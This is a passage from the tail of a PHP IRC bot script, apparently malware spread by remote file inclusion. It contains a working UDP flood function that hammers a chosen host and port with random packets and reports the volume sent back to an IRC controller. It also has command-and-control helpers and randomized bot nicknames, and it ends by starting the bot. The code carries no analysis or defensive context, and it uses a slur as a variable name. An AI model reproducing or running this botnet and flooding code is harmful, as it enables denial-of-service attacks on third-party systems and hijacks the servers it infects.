1430             $vel = round($vel);
1431             $env = round($env);
1432             $fag = "$udpmsg - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite";
1433             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1434             $this->ex('echo 1 >> cache.dat');
1435         }
1436         function udpflood4( $host, $packetsize, $time, $port )
1437         {
1438             $udpmsg = $this->messages['udpmsg'];
1439             $leetprefixwhite = $this->config['leetprefixwhite'];
1440             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1441             $red = $this->config['yellow'];
1442             $blue = $this->config['yellow'];
1443             $this->privmsg( $this->ffff_you( ),"$udpmsg Started On $leetprefixwhite$red $host $leetsuffixwhite for $leetprefixwhite$red $time Seconds $leetsuffixwhite$red With $leetprefixwhite$red $packetsize Packets $leetsuffixwhite$red On port $leetprefixwhite$red $port $leetsuffixwhite" );
1444             $packet = "";
1445             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1446             $timei = time();
1447             $i = 0;
1448             while(time()-$timei < $time)
1449             {
1450                 $fp=fsockopen("udp://".$host,$port,$e,$s,5);
1451                 fwrite($fp,$packet);
1452                 fclose($fp);
1453                 $i++;
1454             }
1455             $env = $i * $packetsize;
1456             $env = $env / 1048576;
1457             $vel = $env / $time;
1458             $vel = round($vel);
1459             $env = round($env);
1460             $fag = "$udpmsg - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite On Port $leetprefixwhite$red $port $leetsuffixwhite";
1461             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1462             $this->ex('echo 1 >> cache.dat');
1463         }
1464         function send($msg)
1465         {
1466             fwrite($this->conn,"$msg\r\n");
1467         }
1468         function join($chan,$key=NULL)
1469         {
1470             $this->send("JOIN $chan $key");
1471         }
1472         function privmsg($to,$msg)
1473         {
1474             $this->send("PRIVMSG $to :$msg");
1475         }
1476         function notice($to,$msg)
1477         {
1478             $this->send("NOTICE $to :$msg");
1479         }
1480          function set_nick()
1481          {
1482             $prefix .= "[RFI|";
1483             $random_number = "";
1484             for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
1485             {
1486                 $random_number .= mt_rand( 0, 9 );
1487             }
1488             $this->nick = sprintf( $prefix.$this->config[ 'nickform' ], $random_number );
1489             $this->send("NICK ".$this->nick);
1490          }
1491          function busk_nick()
1492          {
1493             $prefix .= "[RooT|LinuX|";
1494             $random_number = "";
1495             for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
1496             {
1497                 $random_number .= mt_rand( 0, 9 );
1498             }
1499             $this->nick = sprintf( $prefix.$this->config[ 'nickform2' ], $random_number );
1500             $this->send("NICK ".$this->nick);
1501          }
1502          function nzm_nick()
1503          {
1504             $prefix .= "[USA|";
1505             $random_number = "";
1506             for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
1507             {
1508                 $random_number .= mt_rand( 0, 9 );
1509             }
1510             $ffffu = "$this->config[ 'prfix' ]";
1511             $this->nick = sprintf( $prefix.$this->config['prfix'], $random_number );
1512             $this->send("NICK ".$this->nick);
1513          }
1514         function parse_url_s( $url )
1515         {
1516             $URLpcs = ( parse_url( $url ) );
1517             $PathPcs = explode( "/", $URLpcs['path'] );
1518             $URLpcs['file'] = end( $PathPcs );
1519             unset( $PathPcs[ key( $PathPcs ) ] );
1520             $URLpcs['dir'] = implode("/",$PathPcs);
1521             $fileext = explode( '.', $URLpcs['file'] );
1522             if(count($fileext))
1523             {
1524                 $URLpcs['file_ext'] = $fileext[ count( $fileext ) - 1 ];
1525             }
1526             return ($URLpcs);
1527         }
1528     }
1529     $bot = new Mike_Unix;
1530     $bot->start();
1531 ?>
